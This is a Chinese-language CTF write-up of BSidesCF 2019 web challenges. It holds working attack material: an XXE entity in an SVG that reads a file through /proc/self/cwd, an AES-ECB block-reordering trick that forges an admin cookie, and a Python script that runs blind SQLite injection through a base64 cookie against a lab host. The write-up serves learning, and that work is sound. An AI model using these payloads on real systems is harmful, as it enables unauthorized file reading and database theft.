# BSidesCF 2019

## Kookie

... 用user cookie登上去后抓包吧cookie username改成admin就拿到flag了？


## Pick Tac Toe

还是Burp Suite抓包 修改move的参数，棋子可以强制落

## Svg Magic

Svg应该想到XXE的 就是这个路径...

需要好好积累

> /proc/self 表示当前进程目录

Exp

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

## Mixer

AES EBC 构造密文

根据提示is_admin是个整数

修改cookie:user后出现json串

猜测构造

```
b0c704f59962d7f398084dee08e152d1 {"first_name":"A
33a6d524a13d47f6a4dd63b5e72ee6eb 1.00000000000000
9ba3107987da6eeb016e3c48dbd7c0bf ","last_name":"E
a36daac88addff9f1ccfd106e564f2b8 ki","is_admin":0
1d440a6472a927fc8e26e13b39e31fc2 }



b0c704f59962d7f398084dee08e152d1 {"first_name":"A
33a6d524a13d47f6a4dd63b5e72ee6eb 1.00000000000000
9ba3107987da6eeb016e3c48dbd7c0bf ","last_name":"E
4be6c45f5785fddad8e6c21e6ecdd0ac kii","is_admin":
33a6d524a13d47f6a4dd63b5e72ee6eb 1.00000000000000
1d440a6472a927fc8e26e13b39e31fc2 }
```

## 参考链接

https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/ecb-zh/

### Sequel

Cookie里面可以注SQL

但是最后发现是SQLite,之前在MYSQL上能跑的脚本还跑不出来。。。

贴个脚本学习一下 利用Exist

```python
#coding=utf-8
import requests
import base64
import string
import sys

url="http://61dcd273-6f78-4432-a87c-a51cf39a5593.node3.buuoj.cn/sequels"
#sql="SELECT name FROM sqlite_master WHERE name "
#notes reviews reviews sqlite userinfo
sql = "SELECT username FROM userinfo WHERE name"
out = ""

while True:
    for letter in string.printable:
        tmp = out + letter
        if(tmp[0]=='n'):
            continue
        if(tmp[0]=='r'):
            continue
        if(tmp[0]=='s'):
            continue
        payload = r'{{"username":"\" OR EXISTS({0} LIKE \"{1}%\" limit 1) OR \"","password":"guest"}}'.format(sql,tmp)
                                                            #匹配以{1}开头的数据表
        payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

        r = requests.get(url, cookies={"1337_AUTH" : payload})
        if (tmp[-1]=="%") :
            exit(0)
        if "Movie" in r.text:
            out = tmp
            sys.stdout.write(letter)
            sys.stdout.flush()
            break
```